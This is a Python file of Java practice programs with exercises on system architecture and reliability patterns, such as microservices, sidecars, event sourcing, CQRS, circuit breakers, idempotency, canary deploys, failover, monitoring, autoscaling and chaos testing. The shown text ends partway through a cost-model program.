"""Java practice programs: Architecture, Reliability & Security tab."""
from sd_j_util import J

J("monolith-microservices", r'''
import java.util.*;

public class MonolithVsMicroservicesDemo {
    // Same checkout written two ways. In-process calls can't fail halfway; network calls can.
    interface Inventory { boolean reserve(String sku); }
    interface Payments { boolean charge(int amount); }

    static String checkout(Inventory inv, Payments pay, String sku, int amount) {
        if (!inv.reserve(sku)) return "out of stock";
        if (!pay.charge(amount)) return "payment failed (stock reserved: must be released!)";
        return "order placed";
    }

    static class RemoteCall<T> {                                      // simulates a network hop: latency + possible failure
        static final Random net = new Random(21); static int totalMs = 0;
        static boolean call(String service, boolean result) {
            totalMs += 3;
            if (net.nextInt(10) == 0) throw new RuntimeException(service + " timed out");
            return result;
        }
    }

    public static void main(String[] args) {
        Inventory localInv = sku -> true; Payments localPay = amt -> true;
        System.out.println("monolith      : " + checkout(localInv, localPay, "shoe", 2499) + " (2 in-process calls, ~0 ms, one DB transaction)");
        Inventory remoteInv = sku -> RemoteCall.call("inventory-svc", true);
        Payments remotePay = amt -> RemoteCall.call("payment-svc", true);
        int ok = 0, failed = 0;
        for (int i = 0; i < 20; i++) {
            try { checkout(remoteInv, remotePay, "shoe", 2499); ok++; } catch (RuntimeException e) { failed++; }
        }
        System.out.println("microservices : 20 checkouts -> " + ok + " ok, " + failed + " hit a network failure, " + RemoteCall.totalMs + " ms spent on network hops");
        System.out.println("so microservices need timeouts, retries, idempotency and sagas; in return each service deploys and scales on its own.");
    }
}
''', ["Add a retry (once) around each remote call and see how many checkouts now succeed.",
      "Make payment fail after inventory succeeded and add the compensating `release(sku)` call.",
      "Split the monolith 'modules' behind Java interfaces first (a modular monolith), then swap one implementation for a remote one."])

J("service-discovery", r'''
import java.util.*;

public class ServiceDiscoveryDemo {
    record Instance(String service, String address) {}
    static class Registry {
        final Map<String, Map<String, Long>> instances = new TreeMap<>();      // service -> (address -> last heartbeat)
        void register(Instance i, long now) { instances.computeIfAbsent(i.service(), k -> new TreeMap<>()).put(i.address(), now); }
        void heartbeat(Instance i, long now) { register(i, now); }
        List<String> lookup(String service, long now) {
            return instances.getOrDefault(service, Map.of()).entrySet().stream().filter(e -> now - e.getValue() <= 10).map(Map.Entry::getKey).toList();
        }
    }

    public static void main(String[] args) {
        Registry reg = new Registry();
        Instance p1 = new Instance("payment", "10.0.3.7:8080"), p2 = new Instance("payment", "10.0.3.9:8080");
        reg.register(p1, 0); reg.register(p2, 0);
        System.out.println("t=0  payment -> " + reg.lookup("payment", 0));
        reg.heartbeat(p2, 8);                                               // p1 stopped sending heartbeats (crashed)
        System.out.println("t=12 payment -> " + reg.lookup("payment", 12) + " (10.0.3.7 missed heartbeats, removed)");
        Instance p3 = new Instance("payment", "10.0.4.2:8080"); reg.register(p3, 13);    // autoscaler added an instance
        List<String> live = reg.lookup("payment", 14);
        System.out.println("t=14 payment -> " + live);
        for (int i = 0; i < 4; i++) System.out.println("  order-svc call " + (i + 1) + " -> " + live.get(i % live.size()) + "  (client-side round robin)");
    }
}
''', ["Cache the lookup result in the client for 5 s and discuss what happens when an instance dies inside that window.",
      "Add metadata (version, zone) to instances and prefer instances in the caller's zone.",
      "Implement DNS-style discovery: `lookup` returns one shuffled address list, like a Kubernetes headless service."])

J("service-mesh", r'''
import java.util.*;
import java.util.function.*;

public class SidecarDemo {
    // A sidecar wraps every outgoing call with retries, timeouts, metrics and an mTLS identity check, without touching business code.
    record Call(String from, String to, String path) {}

    static class Sidecar {
        final String identity; final Set<String> allowedCallers; final Map<String, int[]> metrics = new TreeMap<>(); final Random r = new Random(2);
        Sidecar(String identity, Set<String> allowedCallers) { this.identity = identity; this.allowedCallers = allowedCallers; }
        String send(Call c, Function<Call, String> app, Sidecar dest) {
            if (!dest.allowedCallers.contains(c.from())) return "403 denied by mesh policy (" + c.from() + " may not call " + c.to() + ")";
            for (int attempt = 1; attempt <= 3; attempt++) {
                boolean fail = r.nextInt(2) == 0;                          // flaky network: half the attempts fail
                metrics.computeIfAbsent(c.to(), k -> new int[2])[fail ? 1 : 0]++;
                if (!fail) return app.apply(c) + " (attempt " + attempt + ", mTLS " + identity + "->" + dest.identity + ")";
            }
            return "503 after 3 attempts";
        }
    }

    public static void main(String[] args) {
        Sidecar orderSide = new Sidecar("spiffe://shop/order", Set.of());
        Sidecar paymentSide = new Sidecar("spiffe://shop/payment", Set.of("order"));
        Function<Call, String> paymentApp = c -> "200 charged";              // business code knows nothing about retries/TLS
        for (int i = 0; i < 5; i++) System.out.println("order -> payment: " + orderSide.send(new Call("order", "payment", "/charge"), paymentApp, paymentSide));
        System.out.println("search -> payment: " + orderSide.send(new Call("search", "payment", "/charge"), paymentApp, paymentSide));
        orderSide.metrics.forEach((k, v) -> System.out.println("sidecar metrics to " + k + ": ok=" + v[0] + " errors=" + v[1]));
    }
}
''', ["Add traffic splitting: send 10% of calls to `payment-v2` and count how many went there.",
      "Add a circuit breaker in the sidecar that opens after 3 consecutive errors.",
      "Add a per-call timeout using `CompletableFuture.orTimeout`."])

J("bff", r'''
import java.util.*;
import java.util.concurrent.*;

public class BffDemo {
    static Map<String, Object> userSvc(String id) { sleep(30); return Map.of("name", "Asha", "avatar", "a.png", "email", "asha@x.com", "address", "Pune", "joined", 2019); }
    static List<String> ordersSvc(String id) { sleep(40); return List.of("order-987", "order-988", "order-990"); }
    static List<String> recsSvc(String id) { sleep(50); return List.of("socks", "cap", "bottle", "bag"); }
    static void sleep(long ms) { try { Thread.sleep(ms); } catch (InterruptedException ignored) {} }

    // Mobile BFF: one call, parallel fan-out, small payload shaped for the phone screen
    static Map<String, Object> mobileHome(String user) throws Exception {
        ExecutorService ex = Executors.newFixedThreadPool(3);
        try {
            var u = ex.submit(() -> userSvc(user)); var o = ex.submit(() -> ordersSvc(user)); var r = ex.submit(() -> recsSvc(user));
            return Map.of("name", u.get().get("name"), "lastOrder", o.get().get(0), "recs", r.get().subList(0, 2));
        } finally { ex.shutdown(); }
    }

    public static void main(String[] args) throws Exception {
        mobileHome("warm-up");                                               // warm up the JVM before timing
        long t = System.nanoTime();
        Map<String, Object> raw = new LinkedHashMap<>(); raw.put("user", userSvc("42")); raw.put("orders", ordersSvc("42")); raw.put("recs", recsSvc("42"));
        long seqMs = (System.nanoTime() - t) / 1_000_000;
        t = System.nanoTime();
        Map<String, Object> mobile = mobileHome("42");
        long bffMs = (System.nanoTime() - t) / 1_000_000;
        System.out.println("without BFF: phone makes 3 calls one after another, ~" + Math.round(seqMs / 10.0) * 10 + " ms, payload " + raw.toString().length() + " chars");
        System.out.println("with BFF   : 1 call, BFF fans out in parallel, ~" + Math.round(bffMs / 10.0) * 10 + " ms, payload " + mobile.toString().length() + " chars -> " + new TreeMap<>(mobile));
        System.out.println("(on a phone each extra round trip also costs ~100+ ms of mobile network latency)");
    }
}
''', ["Write a `webHome` BFF that returns everything (the web page shows more) and compare payloads.",
      "If the recommendations service is slow (> 80 ms), return the page without recs instead of waiting.",
      "Cache `userSvc` results in the BFF for 60 s."])

J("event-driven", r'''
import java.util.*;
import java.util.function.*;

public class EventBusDemo {
    record Event(String type, Map<String, Object> data) {}
    static class EventBus {
        final Map<String, List<Consumer<Event>>> subs = new TreeMap<>(); final List<Event> log = new ArrayList<>();
        void subscribe(String type, Consumer<Event> handler) { subs.computeIfAbsent(type, k -> new ArrayList<>()).add(handler); }
        void publish(Event e) { log.add(e); subs.getOrDefault(e.type(), List.of()).forEach(h -> h.accept(e)); }
    }

    public static void main(String[] args) {
        EventBus bus = new EventBus();
        // Each service only knows the events, not the other services (choreography)
        bus.subscribe("OrderPlaced", e -> { System.out.println("  payment-svc : charging order " + e.data().get("id")); bus.publish(new Event("PaymentSucceeded", e.data())); });
        bus.subscribe("OrderPlaced", e -> System.out.println("  analytics   : +1 order, Rs " + e.data().get("total")));
        bus.subscribe("PaymentSucceeded", e -> { System.out.println("  warehouse   : pick & pack order " + e.data().get("id")); bus.publish(new Event("OrderShipped", e.data())); });
        bus.subscribe("PaymentSucceeded", e -> System.out.println("  email-svc   : receipt sent for order " + e.data().get("id")));
        bus.subscribe("OrderShipped", e -> System.out.println("  email-svc   : 'your order is on the way'"));
        System.out.println("order-svc publishes OrderPlaced (a real bus is asynchronous; here handlers run inline so the output is in order):");
        bus.publish(new Event("OrderPlaced", Map.of("id", 987, "total", 2499)));
        System.out.println("event log: " + bus.log.stream().map(Event::type).toList());
        System.out.println("adding a new 'loyalty points' service = one more subscribe(...), no change to order-svc.");
    }
}
''', ["Add the loyalty-points subscriber described in the last line.",
      "Make the bus asynchronous with an `ExecutorService` and show the publisher no longer waits for handlers.",
      "Make one handler throw and send the event to a dead-letter list instead of crashing the bus."])

J("event-sourcing", r'''
import java.util.*;

public class EventSourcingDemo {
    sealed interface Event permits Opened, Deposited, Withdrew {}
    record Opened(String owner) implements Event {}
    record Deposited(int amount) implements Event {}
    record Withdrew(int amount) implements Event {}
    record Account(String owner, int balance, int version) {
        Account apply(Event e) {
            return switch (e) {
                case Opened o -> new Account(o.owner(), 0, version + 1);
                case Deposited d -> new Account(owner, balance + d.amount(), version + 1);
                case Withdrew w -> new Account(owner, balance - w.amount(), version + 1);
            };
        }
    }

    static final List<Event> store = new ArrayList<>();                   // append-only, the source of truth

    static void handleWithdraw(int amount) {                              // command -> validate against current state -> new event
        Account now = replay(store.size());
        if (now.balance() < amount) { System.out.println("withdraw " + amount + " rejected: balance " + now.balance()); return; }
        store.add(new Withdrew(amount));
    }
    static Account replay(int upTo) { Account a = new Account(null, 0, 0); for (int i = 0; i < upTo; i++) a = a.apply(store.get(i)); return a; }

    public static void main(String[] args) {
        store.add(new Opened("asha")); store.add(new Deposited(1000));
        handleWithdraw(300); store.add(new Deposited(50)); handleWithdraw(2000); handleWithdraw(200);
        for (int i = 0; i < store.size(); i++) System.out.println("#" + (i + 1) + " " + store.get(i) + "  -> balance " + replay(i + 1).balance());
        System.out.println("current state: " + replay(store.size()));
        System.out.println("time travel, state after event #3: " + replay(3));
        int deposits = store.stream().filter(e -> e instanceof Deposited).mapToInt(e -> ((Deposited) e).amount()).sum();
        System.out.println("new read model built later by replaying: total deposited = " + deposits);
    }
}
''', ["Add a snapshot every 3 events and replay only from the latest snapshot.",
      "Add a `Transferred(to, amount)` event and a second account; keep both consistent.",
      "Version the event schema: add `currency` to `Deposited` and upcast old events that don't have it."])

J("cqrs", r'''
import java.util.*;

public class CqrsDemo {
    // Write side: normalised, validates commands. Read side: denormalised views updated from events (eventually).
    record OrderPlaced(int orderId, int userId, String item, int price) {}
    static final Map<Integer, int[]> ordersTable = new TreeMap<>();          // write model: orderId -> {userId, price}
    static final List<OrderPlaced> events = new ArrayList<>();
    static final Map<Integer, List<String>> myOrdersView = new TreeMap<>();  // read model 1: user's order list
    static final Map<String, Integer> salesByItemView = new TreeMap<>();     // read model 2: dashboard
    static int projectedUpTo = 0;

    static void placeOrder(int orderId, int userId, String item, int price) {
        if (price <= 0) throw new IllegalArgumentException("invalid price");
        ordersTable.put(orderId, new int[]{userId, price});
        events.add(new OrderPlaced(orderId, userId, item, price));
    }
    static void projector() {                                              // runs asynchronously in real life
        for (; projectedUpTo < events.size(); projectedUpTo++) {
            OrderPlaced e = events.get(projectedUpTo);
            myOrdersView.computeIfAbsent(e.userId(), k -> new ArrayList<>()).add(e.item() + "#" + e.orderId());
            salesByItemView.merge(e.item(), e.price(), Integer::sum);
        }
    }

    public static void main(String[] args) {
        placeOrder(1, 42, "shoes", 2499); placeOrder(2, 7, "shoes", 2499); projector();
        placeOrder(3, 42, "socks", 199);
        System.out.println("right after the 3rd command, user 42 view: " + myOrdersView.get(42) + "  <- not projected yet (lag)");
        projector();
        System.out.println("after projector runs   , user 42 view: " + myOrdersView.get(42));
        System.out.println("dashboard view (no joins needed)    : " + salesByItemView);
        myOrdersView.clear(); salesByItemView.clear(); projectedUpTo = 0; projector();
        System.out.println("read views can be dropped and rebuilt from events: " + myOrdersView);
    }
}
''', ["Run the projector on a separate thread every 50 ms and print how stale the view can get.",
      "Add a third read model: 'top customer by spend'.",
      "After placing an order, return the new order to the UI directly from the command so the user doesn't see the lag."])

J("serverless-containers", r'''
import java.util.*;

public class ServerlessVsContainersDemo {
    // Cost and cold-start model for a spiky workload over one day (per hour request counts).
    public static void main(String[] args) {
        int[] reqPerHour = new int[24];
        for (int h = 0; h < 24; h++) reqPerHour[h] = (h >= 9 && h <= 11) ? 400_000 : (h >= 19 && h <= 21 ? 250_000 : 5_000);
        long total = Arrays.stream(reqPerHour).asLongStream().sum();
        double lambdaPerReq = 0.20 / 1e6 + 0.2 * 0.5 * 0.0000166667;         // request fee + 200 ms x 0.5 GB
        double serverless = total * lambdaPerReq;
        double containerPerHour = 0.04;                                       // one small container
        int perContainerPerHour = 100_000;
        double fixedFleet = 24 * containerPerHour * Math.ceil(400_000.0 / perContainerPerHour);
        double autoscaled = 0; for (int r : reqPerHour) autoscaled += containerPerHour * Math.max(1, Math.ceil(r / (double) perContainerPerHour));
        System.out.printf("requests per day: %,d (spiky)%n", total);
        System.out.printf("serverless (pay per request)        : $%.2f/day, scales to zero, cold starts ~%d ms on first requests%n", serverless, 400);
        System.out.printf("containers sized for peak, always on : $%.2f/day%n", fixedFleet);
        System.out.printf("containers with autoscaling          : $%.2f/day, min 1 instance, no cold start for the base load%n", autoscaled);
        int[] steady = new int[24]; Arrays.fill(steady, 400_000);
        double sSteady = Arrays.stream(steady).asLongStream().sum() * lambdaPerReq, cSteady = 24 * containerPerHour * 4;
        System.out.printf("steady 400k/hour all day             : serverless $%.2f vs containers $%.2f -> containers win at constant high load%n", sSteady, cSteady);
    }
}
''', ["Find the requests-per-hour level where serverless and always-on containers cost the same.",
      "Add a cold-start model: the first request after 10 idle minutes takes +400 ms, and print how many requests pay it.",
      "Add 'provisioned concurrency' (always-warm functions) at a fixed hourly price and compare."])

J("resilience-patterns", r'''
import java.util.*;

public class ResilienceDemo {
    static class CircuitBreaker {
        enum State { CLOSED, OPEN, HALF_OPEN }
        State state = State.CLOSED; int failures = 0; long openedAt; final int threshold = 3; final long cooldown = 30;
        String call(long now, java.util.function.Supplier<String> remote, String fallback) {
            if (state == State.OPEN) { if (now - openedAt >= cooldown) state = State.HALF_OPEN; else return fallback + " [breaker OPEN, no call made]"; }
            try {
                String r = remote.get();
                if (state == State.HALF_OPEN) System.out.println("    trial call succeeded -> CLOSED");
                state = State.CLOSED; failures = 0; return r;
            } catch (RuntimeException e) {
                failures++;
                if (state == State.HALF_OPEN || failures >= threshold) {
                    System.out.println(state == State.HALF_OPEN ? "    trial call (HALF-OPEN) failed -> OPEN again at t=" + now : "    3 failures in a row -> breaker OPEN at t=" + now);
                    state = State.OPEN; openedAt = now;
                }
                return fallback + " [" + e.getMessage() + "]";
            }
        }
    }

    static long backoffMs(int attempt, Random r) { long cap = Math.min(5000, 100L << (attempt - 1)); return r.nextLong(cap + 1); }  // full jitter

    public static void main(String[] args) {
        CircuitBreaker cb = new CircuitBreaker();
        boolean[] recsHealthy = new boolean[100]; Arrays.fill(recsHealthy, true);
        for (int t = 10; t < 60; t++) recsHealthy[t] = false;                 // recommendation service down from t=10 to t=60
        for (long t : new long[]{0, 10, 12, 14, 16, 20, 46, 62, 80, 82}) {
            final long tt = t;
            String r = cb.call(t, () -> { if (!recsHealthy[(int) tt]) throw new RuntimeException("timeout"); return "fresh recommendations"; }, "cached top sellers");
            System.out.printf("t=%2d %-9s %s%n", t, cb.state, r);
        }
        Random r = new Random(4);
        StringBuilder sb = new StringBuilder("retry waits with exponential backoff + jitter: ");
        for (int a = 1; a <= 5; a++) sb.append(backoffMs(a, r)).append(" ms  ");
        System.out.println(sb);
    }
}
''', ["Add a bulkhead: limit calls to the recommendation service to 2 concurrent (`Semaphore`) and reject the rest quickly.",
      "Add a timeout with `CompletableFuture.supplyAsync(...).orTimeout(200, MILLISECONDS)`.",
      "Count failures in a sliding window of the last 10 calls (failure rate > 50%) instead of consecutive failures."])

J("idempotency", r'''
import java.util.*;
import java.util.concurrent.*;

public class IdempotencyKeyDemo {
    record Response(int status, String body) {}
    static final ConcurrentHashMap<String, CompletableFuture<Response>> keys = new ConcurrentHashMap<>();
    static int charges = 0;

    static Response charge(String idemKey, int amount) throws Exception {
        CompletableFuture<Response> mine = new CompletableFuture<>();
        CompletableFuture<Response> existing = keys.putIfAbsent(idemKey, mine);       // atomic "INSERT ... ON CONFLICT DO NOTHING"
        if (existing != null) return existing.get();                                 // replay the stored response (waits if still running)
        synchronized (IdempotencyKeyDemo.class) { charges++; }
        Thread.sleep(20);                                                              // talk to the card network
        Response r = new Response(201, "charge ch_" + charges + " for Rs " + amount);
        mine.complete(r);
        return r;
    }

    public static void main(String[] args) throws Exception {
        System.out.println("first attempt : " + charge("k-81", 500));
        System.out.println("client retry  : " + charge("k-81", 500) + " (same response, no new charge)");
        ExecutorService pool = Executors.newFixedThreadPool(5);
        List<Future<Response>> fs = new ArrayList<>();
        for (int i = 0; i < 5; i++) fs.add(pool.submit(() -> charge("k-99", 700)));    // 5 concurrent duplicate requests
        Set<String> bodies = new TreeSet<>(); for (Future<Response> f : fs) bodies.add(f.get().body());
        pool.shutdown();
        System.out.println("5 concurrent duplicates -> distinct responses " + bodies);
        System.out.println("total charges made: " + charges + " (expected 2)");
    }
}
''', ["Reject a retry that reuses a key with a different amount (return 422).",
      "Expire keys after 24 hours of simulated time.",
      "If the charge throws, delete the key so the client can retry, but keep it if the charge succeeded."])

J("deployments", r'''
import java.util.*;

public class CanaryDeployDemo {
    // Gradually shift traffic to v2 while comparing error rates; roll back automatically if v2 is worse.
    static double run(String name, double v2ErrorRate) {
        Random r = new Random(17);
        int[] steps = {1, 5, 25, 50, 100};
        for (int pct : steps) {
            int v1Req = 0, v1Err = 0, v2Req = 0, v2Err = 0;
            for (int i = 0; i < 20_000; i++) {
                boolean toV2 = r.nextInt(100) < pct;
                boolean err = r.nextDouble() < (toV2 ? v2ErrorRate : 0.001);
                if (toV2) { v2Req++; if (err) v2Err++; } else { v1Req++; if (err) v1Err++; }
            }
            double e1 = v1Req == 0 ? 0 : v1Err / (double) v1Req, e2 = v2Err / (double) Math.max(1, v2Req);
            System.out.printf("  %-8s %3d%% on v2: v1 errors %.2f%%, v2 errors %.2f%%", name, pct, e1 * 100, e2 * 100);
            if (v2Req >= 100 && e2 > Math.max(0.002, e1 * 2)) { System.out.println("  -> ROLLBACK to v1"); return pct; }
            System.out.println("  -> healthy, continue");
        }
        return 100;
    }

    public static void main(String[] args) {
        System.out.println("good release:"); run("v2-good", 0.001);
        System.out.println("bad release:"); double stopped = run("v2-bad", 0.03);
        System.out.printf("the bad release reached only %.0f%% of users before rollback%n", stopped);
        // Blue-green: two full environments, the router flips in one step
        String live = "blue"; System.out.println("blue-green: live=" + live);
        live = "green"; System.out.println("blue-green: deploy to green, smoke test, flip router -> live=" + live);
        live = "blue"; System.out.println("blue-green: problem found -> flip back instantly -> live=" + live);
    }
}
''', ["Also compare p99 latency of v1 and v2 and roll back if v2 is 20% slower.",
      "Implement feature flags: a `Map<String,Integer>` of flag -> % of users, using a stable hash of the user id.",
      "Simulate a rolling deploy of 10 instances, 2 at a time, and print the mix of versions after each step."])

J("config-multitenancy", r'''
import java.util.*;

public class MultiTenancyDemo {
    record Invoice(String tenant, int id, int amount) {}
    static final List<Invoice> sharedTable = List.of(new Invoice("acme", 1, 500), new Invoice("acme", 2, 700), new Invoice("globex", 3, 900));
    static final ThreadLocal<String> currentTenant = new ThreadLocal<>();

    static List<Invoice> findInvoices() {                                        // every query is automatically scoped (like row-level security)
        String t = Objects.requireNonNull(currentTenant.get(), "no tenant in context");
        return sharedTable.stream().filter(i -> i.tenant().equals(t)).toList();
    }

    static final Map<String, Map<String, Object>> tenantConfig = Map.of(
        "acme", Map.of("plan", "enterprise", "rateLimit", 1000, "darkMode", true),
        "globex", Map.of("plan", "free", "rateLimit", 50, "darkMode", false));
    static final Map<String, Integer> usage = new HashMap<>();

    static String handle(String tenant, String path) {
        currentTenant.set(tenant);
        try {
            int limit = (Integer) tenantConfig.get(tenant).get("rateLimit");
            if (usage.merge(tenant, 1, Integer::sum) > limit) return tenant + " " + path + " -> 429 (noisy neighbour contained)";
            return tenant + " " + path + " -> " + findInvoices().stream().map(Invoice::id).toList();
        } finally { currentTenant.remove(); }
    }

    public static void main(String[] args) {
        System.out.println(handle("acme", "/invoices"));
        System.out.println(handle("globex", "/invoices"));
        for (int i = 0; i < 60; i++) handle("globex", "/invoices");
        System.out.println(handle("globex", "/invoices"));
        System.out.println(handle("acme", "/invoices") + " (acme unaffected)");
        try { findInvoices(); } catch (NullPointerException e) { System.out.println("query without tenant context -> refused: " + e.getMessage()); }
    }
}
''', ["Add a 'database per tenant' mode for enterprise tenants: route their queries to a separate map.",
      "Load tenant config from a properties string and reload it without restarting.",
      "Add per-tenant feature flags and show `darkMode` only for tenants that have it."])

J("redundancy-failover", r'''
import java.util.*;

public class FailoverDemo {
    static class Db { final String name; boolean alive = true; long lsn = 0; Db(String n) { name = n; } }

    public static void main(String[] args) {
        Db primary = new Db("db-primary"), standby = new Db("db-standby");
        String vip = primary.name; int missed = 0; long lostWrites = 0;
        for (int t = 0; t <= 60; t += 5) {
            if (primary.alive) { primary.lsn += 10; if (t % 10 == 0) standby.lsn = primary.lsn; }    // async replication every 10 s
            if (t == 25) { primary.alive = false; System.out.println("t=25 primary crashes (lsn " + primary.lsn + ", standby at " + standby.lsn + ")"); }
            if (vip.equals(primary.name)) {
                if (primary.alive) missed = 0; else missed++;
                if (missed == 3) {
                    lostWrites = primary.lsn - standby.lsn;
                    vip = standby.name;
                    System.out.println("t=" + t + " 3 health checks failed -> promote standby, move virtual IP -> " + vip);
                }
            }
            System.out.printf("t=%2d app writes go to %-11s %s%n", t, vip, vip.equals(primary.name) && !primary.alive ? "(FAILING: downtime)" : "");
        }
        System.out.println("downtime ~ detection (3 x 5 s) = 15 s; writes lost because replication was async: " + lostWrites);
        System.out.println("old primary must be fenced (never accept writes again) to avoid split brain.");
    }
}
''', ["Make replication synchronous (copy lsn on every write) and confirm no writes are lost; what does it cost?",
      "Reduce the health-check interval to 1 s; what's the new downtime and the risk of false failovers?",
      "Add active–active: two primaries each serving half the users, and fail one over to the other."])

J("disaster-recovery", r'''
import java.util.*;

public class DisasterRecoveryDemo {
    record Strategy(String name, int rpoMin, int rtoMin, int costPerMonth) {}

    public static void main(String[] args) {
        List<Strategy> s = List.of(new Strategy("backup & restore (daily)", 24 * 60, 8 * 60, 200), new Strategy("pilot light", 15, 45, 1_500),
            new Strategy("warm standby", 1, 10, 6_000), new Strategy("multi-site active-active", 0, 1, 20_000));
        int maxRpo = 30, maxRto = 60;                                     // business requirement
        System.out.println("requirement: lose at most " + maxRpo + " min of data, be back within " + maxRto + " min");
        Strategy pick = null;
        for (Strategy x : s) {
            boolean ok = x.rpoMin() <= maxRpo && x.rtoMin() <= maxRto;
            System.out.printf("  %-26s RPO %5d min  RTO %4d min  $%,6d/month  %s%n", x.name(), x.rpoMin(), x.rtoMin(), x.costPerMonth(), ok ? "meets it" : "too slow");
            if (ok && pick == null) pick = x;
        }
        System.out.println("cheapest that meets it: " + pick.name());
        // Restore drill: rebuild state from the last snapshot + replayed log, and verify
        Map<String, Integer> prod = new TreeMap<>(Map.of("a", 1, "b", 2, "c", 3));
        Map<String, Integer> snapshot = new TreeMap<>(prod);
        List<String[]> logSinceSnapshot = List.of(new String[]{"a", "10"}, new String[]{"d", "4"});
        for (String[] op : logSinceSnapshot) prod.put(op[0], Integer.parseInt(op[1]));
        Map<String, Integer> restored = new TreeMap<>(snapshot); for (String[] op : logSinceSnapshot) restored.put(op[0], Integer.parseInt(op[1]));
        System.out.println("restore drill: restored == production? " + restored.equals(prod) + " " + restored);
    }
}
''', ["Change the requirement to RPO 5 min / RTO 15 min and see which strategy is picked.",
      "Drop the last log entry from the backup (the RPO gap) and print exactly what was lost.",
      "Compute the expected yearly cost of downtime ($10,000 per hour, one disaster per 5 years) for each strategy and add it to the monthly price."])

J("monitoring", r'''
import java.util.*;

public class MonitoringDemo {
    // Metrics (RED), structured logs with a request id, and a trace of spans.
    record Span(String name, long startMs, long durMs, int depth) {}

    public static void main(String[] args) {
        Random r = new Random(6); List<Integer> latencies = new ArrayList<>(); int errors = 0, requests = 1200;
        for (int i = 0; i < requests; i++) { int l = 40 + r.nextInt(60) + (r.nextInt(50) == 0 ? 800 : 0); latencies.add(l); if (r.nextInt(200) == 0) errors++; }
        Collections.sort(latencies);
        System.out.printf("RED  rate=%d req/min  errors=%.2f%%  duration p50=%d ms p99=%d ms%n", requests, errors * 100.0 / requests, latencies.get(600), latencies.get((int) (requests * 0.99)));
        double slo = 0.995, errorRate = errors / (double) requests, burn = errorRate / (1 - slo);
        System.out.printf("SLO 99.5%% -> burn rate %.2f %s%n", burn, burn > 2 ? "(page someone!)" : "(ok)");
        String reqId = "req-7f3a";
        System.out.println("{\"ts\":\"10:02:03.120\",\"level\":\"INFO\",\"svc\":\"order\",\"req\":\"" + reqId + "\",\"msg\":\"checkout start\",\"user\":42}");
        System.out.println("{\"ts\":\"10:02:03.520\",\"level\":\"WARN\",\"svc\":\"payment\",\"req\":\"" + reqId + "\",\"msg\":\"psp slow\",\"ms\":280}");
        List<Span> trace = List.of(new Span("GET /checkout (gateway)", 0, 420, 0), new Span("order-svc", 10, 390, 1), new Span("inventory.reserve", 20, 60, 2),
            new Span("payment.charge", 85, 280, 2), new Span("db insert", 370, 25, 2));
        System.out.println("trace " + reqId + ":");
        for (Span s : trace) System.out.printf("  %-26s %s%s %d ms%n", "  ".repeat(s.depth()) + s.name(), " ".repeat((int) (s.startMs() / 20)), "█".repeat((int) Math.max(1, s.durMs() / 20)), s.durMs());
        Span slow = trace.stream().filter(s -> s.depth() == 2).max(Comparator.comparingLong(Span::durMs)).get();
        System.out.println("bottleneck: " + slow.name() + " (" + slow.durMs() + " ms)");
    }
}
''', ["Add a histogram with buckets (≤50, ≤100, ≤250, ≤1000 ms) like Prometheus and compute p99 from the buckets.",
      "Generate trace and span ids and propagate them through 3 method calls via a `ThreadLocal` context.",
      "Alert only if the burn rate is high over both a 5-minute and a 1-hour window."])

J("autoscaling", r'''
public class AutoscalerDemo {
    // HPA-style: desired = ceil(current * currentUtil / targetUtil), with a scale-down cooldown and a startup delay.
    public static void main(String[] args) {
        int[] loadPerMin = {200, 220, 600, 1400, 1800, 1800, 1700, 900, 400, 300, 250, 220};
        int capacityPerPod = 100, pods = 3, target = 60, minPods = 2, maxPods = 30, coolDown = 3, lastScaleDown = -10;
        int[] ready = new int[loadPerMin.length + 3];
        System.out.println("min  load  pods  util   action");
        for (int m = 0; m < loadPerMin.length; m++) {
            pods += ready[m];                                                 // pods requested 1 min ago are now ready
            int util = (int) Math.min(999, Math.round(loadPerMin[m] * 100.0 / (pods * capacityPerPod)));
            int desired = Math.max(minPods, Math.min(maxPods, (int) Math.ceil(pods * util / (double) target)));
            String action = "hold";
            if (desired > pods) { ready[m + 1] += desired - pods; action = "scale up +" + (desired - pods) + " (ready next minute)"; }
            else if (desired < pods && m - lastScaleDown >= coolDown) { action = "scale down -" + (pods - desired); pods = desired; lastScaleDown = m; }
            else if (desired < pods) action = "would scale down, in cooldown";
            System.out.printf("%3d  %4d  %4d  %3d%%  %s%s%n", m, loadPerMin[m], pods, util, action, util > 100 ? "  <- overloaded while new pods start" : "");
        }
    }
}
''', ["Scale on queue length instead of CPU: desired = ceil(backlog / (itemsPerPodPerMinute)).",
      "Add predictive scaling: start pods at minute 1 because you know the spike comes at minute 2.",
      "Add a DB connection limit of 300 and 20 connections per pod; cap pods so you never exceed it."])

J("chaos-engineering", r'''
import java.util.*;

public class ChaosDemo {
    // Steady-state hypothesis: checkout success >= 99%. Inject faults; abort the experiment if the hypothesis breaks.
    static boolean hasTimeout = false, hasFallback = false;

    static boolean checkout(Random r, String fault) {
        boolean recsUp = !fault.equals("kill recommendations");
        boolean slowPayments = fault.equals("payment +2s latency") && r.nextInt(10) < 3;
        if (!recsUp && !hasFallback) return false;                      // page crashes without recommendations
        if (slowPayments && !hasTimeout) return false;                  // threads pile up, requests fail
        return r.nextInt(1000) != 0;
    }

    static void experiment(String fault) {
        Random r = new Random(13); int ok = 0, n = 2000;
        for (int i = 0; i < n; i++) if (checkout(r, fault)) ok++;
        double rate = ok * 100.0 / n;
        System.out.printf("  %-24s success %.1f%% -> %s%n", fault, rate, rate >= 99 ? "hypothesis holds" : "BROKEN: abort, fix it");
    }

    public static void main(String[] args) {
        System.out.println("round 1 (no resilience):");
        for (String f : List.of("none", "kill recommendations", "payment +2s latency")) experiment(f);
        hasFallback = true; hasTimeout = true;
        System.out.println("round 2 (added fallback for recs + timeout/retry for payments):");
        for (String f : List.of("none", "kill recommendations", "payment +2s latency")) experiment(f);
    }
}
''', ["Add a 'kill one of three app servers' fault with a load balancer and check the steady state.",
      "Limit the blast radius: inject the fault for only 5% of requests and compare the measured impact.",
      "Add an automatic abort that stops injecting as soon as the running success rate drops below 98%."])

J("cost", r'''
import java.util.*;

public class CostModelDemo {
    record Line(String item, double qty, double unitPrice, String unit) { double cost() { return qty * unitPrice; } }

    public static void main(String[] args) {
        List<Line> bill = new ArrayList<>(List.of(
            new Line("app servers", 20, 150, "server-month"), new Line("database primary + 2 replicas", 3, 1200, "node-month"),
            new Line("object storage", 200, 23, "TB-month"), new Line("CDN egress", 500, 20, "TB"), new Line("Redis cache", 2, 400, "node-month")));
        print("baseline", bill);
        List<Line> optimised = new ArrayList<>();
        for (Line l : bill) switch (l.item()) {
            case "app servers" -> optimised.add(new Line("app servers (autoscaled, avg 12)", 12, 150 * 0.7, "server-month, 1-yr commit"));
